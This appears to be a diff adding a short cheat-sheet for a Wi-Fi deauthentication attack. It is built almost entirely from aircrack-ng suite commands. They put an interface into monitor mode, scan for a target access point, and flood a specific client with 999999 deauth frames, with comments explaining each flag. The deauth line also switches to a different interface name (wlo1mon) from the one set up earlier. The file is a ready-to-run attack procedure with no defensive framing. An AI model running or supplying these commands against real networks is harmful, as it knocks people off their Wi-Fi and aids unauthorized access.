@@ -1,0 +1,25 @@
+##########################
+## WiFi Deauthentication Attack
+##########################
+
+# 1. Put the WiFi interface into monitor mode
+iwconfig # -> check the interface name
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig # -> testing the mode of operation
+
+# 2. Identify the network and the target
+airodump-ng -i wlan0mon 
+airodump-ng -i wlan0mon --bssid 34:2C:C4:93:45:97 -c 1 # -> narrow down the result
+
+# 3. Launching the deauthentication attack
+aireplay-ng --test wlan0mon # -> testing injection
+aireplay-ng --deauth 999999 -a 34:2C:C4:93:45:97 -c b4:c4:fc:67:57:08 wlo1mon
+
+# --deauth -> no. of deauth frames to send (0 means continuously)
+# -a -> MAC address of the AP 
+# -c -> MAC address of the client to deauthenticate 
+
+
+# testing injection
+aireplay-ng --test wlan0mon 
